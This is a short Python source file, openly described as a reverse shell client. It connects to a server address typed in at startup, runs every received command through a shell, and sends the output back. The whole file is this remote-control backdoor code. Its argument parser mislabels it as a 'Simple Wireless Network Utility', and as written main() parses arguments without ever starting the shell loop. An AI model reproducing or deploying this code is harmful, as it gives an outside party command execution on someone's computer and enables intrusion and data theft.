"""
python reverse shell client program

usage: python v_client.py

todo:  test for cmd bugs/ exceptions/ unix/ linux/

"""

import socket
import os
import subprocess
import argparse


def client_connect():
    s = socket.socket()  # client computer can connect to others

    # ip address of server, can use own computer's private IP if doing on local
    host = str(input("Enter the IP address of the server that wants to control your computer: "))
    port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))

    s.connect((host, port))  # binds client computer to server computer

    # infinite loop for continuous listening for server's commands
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':  # command to change directory (cd)
            os.chdir(data[3:].decode("utf-8"))  # look at target directory to cd to

        if len(data) > 0:  # check if there are actually data/commands received (that is not cd)

            # opens up a process to run a cmd similar to running in terminal
            # takes out any output and pipes out to standard stream
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            # bytes and string versions of results
            output_bytes = cmd.stdout.read() + cmd.stderr.read()  # bytes version of streamed output
            output_str = str(output_bytes, "utf-8")  # plain old basic string

            # getcwd allows the server side to see where the current working directory is on the client
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            # print(output_str)  # comment to allow client to see what server side is doing

    # close connection
    s.close()

def parse():
    """parse any arguments passed into the cmd line"""

    parser = argparse.ArgumentParser(prog='ipTools.py',
                                     description='''Simple Wireless Network Utility''',
                                     epilog='''Created by K''',
                                     usage='%(prog)s address [-p] [port] '
                                     )
    parser.add_argument("address", type=str, help="server Address : 8.8.8.8")
    parser.add_argument("-p", "--port", type=int, default="9999", help="Port to connect on")

    args = parser.parse_args()

    # store the input args
    address = args.address
    port = args.port

    # call main method


def main():
    # Parse args passed in then run mgmt module
    parse()


if __name__ == '__main__':
    # call the main function
    main()
